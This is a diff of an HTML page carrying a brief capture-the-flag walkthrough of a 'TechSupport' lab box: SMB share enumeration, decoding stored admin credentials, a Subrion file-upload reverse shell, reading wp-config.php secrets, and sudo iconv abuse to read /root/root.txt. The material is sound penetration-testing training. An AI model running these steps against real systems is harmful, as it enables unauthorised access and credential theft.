@@ -122,162 +122,162 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT    STATE SERVICE
+<div class="codehilite"><pre><span></span><code>PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>smbclient -L \\\\10.66.145.77\\                                          
-Password for [WORKGROUP\kali]:
+<div class="codehilite"><pre><span></span><code><span class="nv">smbclient</span><span class="w"> </span><span class="o">-</span><span class="nv">L</span><span class="w"> </span>\\\\<span class="mi">10</span>.<span class="mi">66</span>.<span class="mi">145</span>.<span class="mi">77</span>\\<span class="w">                                          </span>
+<span class="nv">Password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>[<span class="nv">WORKGROUP</span>\<span class="nv">kali</span>]:
 
-        Sharename       Type      Comment
-        ---------       ----      -------
-        print$          Disk      Printer Drivers
-        websvr          Disk      
-        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
-</code></pre>
+<span class="w">        </span><span class="nv">Sharename</span><span class="w">       </span><span class="nv">Type</span><span class="w">      </span><span class="nv">Comment</span>
+<span class="w">        </span><span class="o">---------</span><span class="w">       </span><span class="o">----</span><span class="w">      </span><span class="o">-------</span>
+<span class="w">        </span><span class="nv">print</span>$<span class="w">          </span><span class="nv">Disk</span><span class="w">      </span><span class="nv">Printer</span><span class="w"> </span><span class="nv">Drivers</span>
+<span class="w">        </span><span class="nv">websvr</span><span class="w">          </span><span class="nv">Disk</span><span class="w">      </span>
+<span class="w">        </span><span class="nv">IPC</span>$<span class="w">            </span><span class="nv">IPC</span><span class="w">       </span><span class="nv">IPC</span><span class="w"> </span><span class="nv">Service</span><span class="w"> </span><span class="ss">(</span><span class="nv">TechSupport</span><span class="w"> </span><span class="nv">server</span><span class="w"> </span><span class="ss">(</span><span class="nv">Samba</span>,<span class="w"> </span><span class="nv">Ubuntu</span><span class="ss">))</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>smbclient -N //10.66.145.77/websvr 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Sat May 29 03:17:38 2021
-  ..                                  D        0  Sat May 29 03:03:47 2021
-  enter.txt                           N      273  Sat May 29 03:17:38 2021
+<div class="codehilite"><pre><span></span><code><span class="nx">smbclient</span><span class="w"> </span><span class="o">-</span><span class="nx">N</span><span class="w"> </span><span class="c1">//10.66.145.77/websvr </span>
+<span class="nx">Try</span><span class="w"> </span><span class="s">&quot;help&quot;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">possible</span><span class="w"> </span><span class="nx">commands</span><span class="p">.</span>
+<span class="nx">smb</span><span class="p">:</span><span class="w"> </span><span class="err">\</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">ls</span>
+<span class="w">  </span><span class="p">.</span><span class="w">                                   </span><span class="nx">D</span><span class="w">        </span><span class="mi">0</span><span class="w">  </span><span class="nx">Sat</span><span class="w"> </span><span class="nx">May</span><span class="w"> </span><span class="mi">29</span><span class="w"> </span><span class="mi">03</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">38</span><span class="w"> </span><span class="mi">2021</span>
+<span class="w">  </span><span class="p">..</span><span class="w">                                  </span><span class="nx">D</span><span class="w">        </span><span class="mi">0</span><span class="w">  </span><span class="nx">Sat</span><span class="w"> </span><span class="nx">May</span><span class="w"> </span><span class="mi">29</span><span class="w"> </span><span class="mi">03</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">47</span><span class="w"> </span><span class="mi">2021</span>
+<span class="w">  </span><span class="nx">enter</span><span class="p">.</span><span class="nx">txt</span><span class="w">                           </span><span class="nx">N</span><span class="w">      </span><span class="mi">273</span><span class="w">  </span><span class="nx">Sat</span><span class="w"> </span><span class="nx">May</span><span class="w"> </span><span class="mi">29</span><span class="w"> </span><span class="mi">03</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">38</span><span class="w"> </span><span class="mi">2021</span>
 
-                8460484 blocks of size 1024. 5699672 blocks available
-smb: \&gt; cat enter.txt
-cat: command not found
-smb: \&gt; type enter.txt
-type: command not found
-smb: \&gt; get enter.txt
-getting file \enter.txt of size 273 as enter.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
-smb: \&gt; exit
-</code></pre>
+<span class="w">                </span><span class="mi">8460484</span><span class="w"> </span><span class="nx">blocks</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mi">1024</span><span class="p">.</span><span class="w"> </span><span class="mi">5699672</span><span class="w"> </span><span class="nx">blocks</span><span class="w"> </span><span class="nx">available</span>
+<span class="nx">smb</span><span class="p">:</span><span class="w"> </span><span class="err">\</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">enter</span><span class="p">.</span><span class="nx">txt</span>
+<span class="nx">cat</span><span class="p">:</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">found</span>
+<span class="nx">smb</span><span class="p">:</span><span class="w"> </span><span class="err">\</span><span class="p">&gt;</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="nx">enter</span><span class="p">.</span><span class="nx">txt</span>
+<span class="k">type</span><span class="p">:</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">found</span>
+<span class="nx">smb</span><span class="p">:</span><span class="w"> </span><span class="err">\</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">enter</span><span class="p">.</span><span class="nx">txt</span>
+<span class="nx">getting</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="err">\</span><span class="nx">enter</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mi">273</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">enter</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.2</span><span class="w"> </span><span class="nx">KiloBytes</span><span class="o">/</span><span class="nx">sec</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">average</span><span class="w"> </span><span class="m m-Double">0.2</span><span class="w"> </span><span class="nx">KiloBytes</span><span class="o">/</span><span class="nx">sec</span><span class="p">)</span>
+<span class="nx">smb</span><span class="p">:</span><span class="w"> </span><span class="err">\</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">exit</span>
+</code></pre></div>
 
-<pre class="codehilite"><code> cat enter.txt         
-GOALS
-=====
-1)Make fake popup and host it online on Digital Ocean server
-2)Fix subrion site, /subrion doesn't work, edit from panel
-3)Edit wordpress website
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">enter</span><span class="p">.</span><span class="n">txt</span><span class="w">         </span>
+<span class="n">GOALS</span>
+<span class="o">=====</span>
+<span class="mi">1</span><span class="p">)</span><span class="n">Make</span><span class="w"> </span><span class="n">fake</span><span class="w"> </span><span class="n">popup</span><span class="w"> </span><span class="kr">and</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">online</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Digital</span><span class="w"> </span><span class="n">Ocean</span><span class="w"> </span><span class="n">server</span>
+<span class="mi">2</span><span class="p">)</span><span class="n">Fix</span><span class="w"> </span><span class="n">subrion</span><span class="w"> </span><span class="n">site</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">subrion</span><span class="w"> </span><span class="n">doesn</span><span class="s">&#39;t work, edit from panel</span>
+<span class="s">3)Edit wordpress website</span>
 
-IMP
-===
-Subrion creds
-|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
-Wordpress creds
-|-&gt;
-</code></pre>
+<span class="s">IMP</span>
+<span class="s">===</span>
+<span class="s">Subrion creds</span>
+<span class="s">|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]</span>
+<span class="s">Wordpress creds</span>
+<span class="s">|-&gt;</span>
+</code></pre></div>
 
 <blockquote>
 <p>to get password</p>
 </blockquote>
-<pre class="codehilite"><code>FROM
+<div class="codehilite"><pre><span></span><code><span class="n">FROM</span>
 
-base58 --&gt; base32 --&gt; base64 
-</code></pre>
+<span class="n">base58</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">base32</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span>
+</code></pre></div>
 
 <blockquote>
 <p>login to ‘Subrion/Pannel'</p>
 </blockquote>
-<pre class="codehilite"><code>└─$ searchsploit 'subrion'
+<div class="codehilite"><pre><span></span><code><span class="err">└─</span><span class="o">$</span><span class="w"> </span><span class="n">searchsploit</span><span class="w"> </span><span class="s1">&#39;subrion&#39;</span>
 
-Subrion CMS 4.2.1 - Arbitrary File Upload                                                                               | php/webapps/49876.py
-</code></pre>
+<span class="n">Subrion</span><span class="w"> </span><span class="n">CMS</span><span class="w"> </span><span class="mf">4.2</span><span class="o">.</span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Arbitrary</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="n">Upload</span><span class="w">                                                                               </span><span class="o">|</span><span class="w"> </span><span class="n">php</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">49876.</span><span class="n">py</span>
+</code></pre></div>
 
 <blockquote>
 <p>before upload reverse shell need to change filetype  <code>phar</code></p>
 </blockquote>
-<pre class="codehilite"><code>www-data@TechSupport:/var/www$ cd html
-www-data@TechSupport:/var/www/html$ ls
-index.html  phpinfo.php  subrion  test  wordpress
-www-data@TechSupport:/var/www/html$ cd wordpress
-www-data@TechSupport:/var/www/html/wordpress$ ls
-index.php        wp-blog-header.php    wp-includes        wp-settings.php
-license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
-readme.html      wp-config.php         wp-load.php        wp-trackback.php
-wp-activate.php  wp-content            wp-login.php       xmlrpc.php
-wp-admin         wp-cron.php           wp-mail.php
-www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
-&lt;?php
-/**
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">TechSupport</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">html</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">TechSupport</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="w">  </span><span class="n">phpinfo</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">subrion</span><span class="w">  </span><span class="n">test</span><span class="w">  </span><span class="n">wordpress</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">TechSupport</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">wordpress</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">TechSupport</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wordpress</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="w">        </span><span class="n">wp</span><span class="o">-</span><span class="n">blog</span><span class="o">-</span><span class="n">header</span><span class="o">.</span><span class="n">php</span><span class="w">    </span><span class="n">wp</span><span class="o">-</span><span class="n">includes</span><span class="w">        </span><span class="n">wp</span><span class="o">-</span><span class="n">settings</span><span class="o">.</span><span class="n">php</span>
+<span class="n">license</span><span class="o">.</span><span class="n">txt</span><span class="w">      </span><span class="n">wp</span><span class="o">-</span><span class="n">comments</span><span class="o">-</span><span class="n">post</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">wp</span><span class="o">-</span><span class="n">links</span><span class="o">-</span><span class="n">opml</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">wp</span><span class="o">-</span><span class="n">signup</span><span class="o">.</span><span class="n">php</span>
+<span class="n">readme</span><span class="o">.</span><span class="n">html</span><span class="w">      </span><span class="n">wp</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">php</span><span class="w">         </span><span class="n">wp</span><span class="o">-</span><span class="nb">load</span><span class="o">.</span><span class="n">php</span><span class="w">        </span><span class="n">wp</span><span class="o">-</span><span class="n">trackback</span><span class="o">.</span><span class="n">php</span>
+<span class="n">wp</span><span class="o">-</span><span class="n">activate</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="w">            </span><span class="n">wp</span><span class="o">-</span><span class="n">login</span><span class="o">.</span><span class="n">php</span><span class="w">       </span><span class="n">xmlrpc</span><span class="o">.</span><span class="n">php</span>
+<span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="w">         </span><span class="n">wp</span><span class="o">-</span><span class="n">cron</span><span class="o">.</span><span class="n">php</span><span class="w">           </span><span class="n">wp</span><span class="o">-</span><span class="n">mail</span><span class="o">.</span><span class="n">php</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">TechSupport</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wordpress</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">wp</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">php</span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<span class="o">/**</span>
 
- * @link https://wordpress.org/support/article/editing-wp-config-php/
- *
- * @package WordPress
- */
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="err">@</span><span class="n">link</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">support</span><span class="o">/</span><span class="n">article</span><span class="o">/</span><span class="n">editing</span><span class="o">-</span><span class="n">wp</span><span class="o">-</span><span class="n">config</span><span class="o">-</span><span class="n">php</span><span class="o">/</span>
+<span class="w"> </span><span class="o">*</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="err">@</span><span class="n">package</span><span class="w"> </span><span class="n">WordPress</span>
+<span class="w"> </span><span class="o">*/</span>
 
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'wpdb' );
+<span class="o">//</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">settings</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="o">//</span>
+<span class="o">/**</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;wpdb&#39;</span><span class="w"> </span><span class="p">);</span>
 
-/** MySQL database username */
-define( 'DB_USER', 'support' );
+<span class="o">/**</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;support&#39;</span><span class="w"> </span><span class="p">);</span>
 
-/** MySQL database password */
-define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+<span class="o">/**</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ImAScammerLOL!123!&#39;</span><span class="w"> </span><span class="p">);</span>
 
-/** MySQL hostname */
-define( 'DB_HOST', 'localhost' );
+<span class="o">/**</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="w"> </span><span class="p">);</span>
 
-/** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
+<span class="o">/**</span><span class="w"> </span><span class="n">Database</span><span class="w"> </span><span class="n">Charset</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">creating</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">tables</span><span class="o">.</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_CHARSET&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf8&#39;</span><span class="w"> </span><span class="p">);</span>
 
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
+<span class="o">/**</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Database</span><span class="w"> </span><span class="n">Collate</span><span class="w"> </span><span class="n">type</span><span class="o">.</span><span class="w"> </span><span class="n">Don</span><span class="s1">&#39;t change this if in doubt. */</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="p">);</span>
 
-/**#@+
- * Authentication Unique Keys and Salts.
- *
+<span class="o">/**</span><span class="c1">#@+</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Authentication</span><span class="w"> </span><span class="n">Unique</span><span class="w"> </span><span class="n">Keys</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">Salts</span><span class="o">.</span>
+<span class="w"> </span><span class="o">*</span>
 
 
-/**#@-*/
+<span class="o">/**</span><span class="c1">#@-*/</span>
 
-/**
- * WordPress Database Table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix = 'wp_';
+<span class="o">/**</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="n">Database</span><span class="w"> </span><span class="n">Table</span><span class="w"> </span><span class="n">prefix</span><span class="o">.</span>
+<span class="w"> </span><span class="o">*</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">multiple</span><span class="w"> </span><span class="n">installations</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">give</span><span class="w"> </span><span class="n">each</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">unique</span><span class="w"> </span><span class="n">prefix</span><span class="o">.</span><span class="w"> </span><span class="n">Only</span><span class="w"> </span><span class="n">numbers</span><span class="p">,</span><span class="w"> </span><span class="n">letters</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">underscores</span><span class="w"> </span><span class="n">please</span><span class="o">!</span>
+<span class="w"> </span><span class="o">*/</span>
+<span class="o">$</span><span class="n">table_prefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;wp_&#39;</span><span class="p">;</span>
 
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- *
- * For information on other constants that can be used for debugging,
- * visit the documentation.
- *
- * @link https://wordpress.org/support/article/debugging-in-wordpress/
- */
-define( 'WP_DEBUG', false );
+<span class="o">/**</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">developers</span><span class="p">:</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="n">debugging</span><span class="w"> </span><span class="n">mode</span><span class="o">.</span>
+<span class="w"> </span><span class="o">*</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Change</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="bp">true</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">notices</span><span class="w"> </span><span class="n">during</span><span class="w"> </span><span class="n">development</span><span class="o">.</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">strongly</span><span class="w"> </span><span class="n">recommended</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">plugin</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">theme</span><span class="w"> </span><span class="n">developers</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">WP_DEBUG</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">development</span><span class="w"> </span><span class="n">environments</span><span class="o">.</span>
+<span class="w"> </span><span class="o">*</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">constants</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">debugging</span><span class="p">,</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">visit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">documentation</span><span class="o">.</span>
+<span class="w"> </span><span class="o">*</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="err">@</span><span class="n">link</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">support</span><span class="o">/</span><span class="n">article</span><span class="o">/</span><span class="n">debugging</span><span class="o">-</span><span class="ow">in</span><span class="o">-</span><span class="n">wordpress</span><span class="o">/</span>
+<span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;WP_DEBUG&#39;</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="w"> </span><span class="p">);</span>
 
-/* That's all, stop editing! Happy publishing. */
+<span class="o">/*</span><span class="w"> </span><span class="n">That</span><span class="s1">&#39;s all, stop editing! Happy publishing. */</span>
 
-/** Absolute path to the WordPress directory. */
-if ( ! defined( 'ABSPATH' ) ) {
-        define( 'ABSPATH', __DIR__ . '/wordpress/' );
-}
-</code></pre>
+<span class="o">/**</span><span class="w"> </span><span class="n">Absolute</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="n">directory</span><span class="o">.</span><span class="w"> </span><span class="o">*/</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">defined</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;ABSPATH&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;ABSPATH&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">__DIR__</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;/wordpress/&#39;</span><span class="w"> </span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>Matching Defaults entries for scamsite on TechSupport:
+<div class="codehilite"><pre><span></span><code>Matching Defaults entries for scamsite on TechSupport:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User scamsite may run the following commands on TechSupport:
     (ALL) NOPASSWD: /usr/bin/iconv
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code> LFILE=/root/root.txt
-scamsite@TechSupport:/home$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 &quot;$LFILE&quot;
-.......................  -
-scamsite@TechSupport:/home$ 
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="n">LFILE</span><span class="o">=/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">scamsite</span><span class="nv">@TechSupport</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">iconv</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="mi">8859</span><span class="n">_1</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">8859</span><span class="n">_1</span><span class="w"> </span><span class="ss">&quot;$LFILE&quot;</span>
+<span class="p">.......................</span><span class="w">  </span><span class="o">-</span>
+<span class="n">scamsite</span><span class="nv">@TechSupport</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span>
+</code></pre></div>
         </div>
     </main>
 
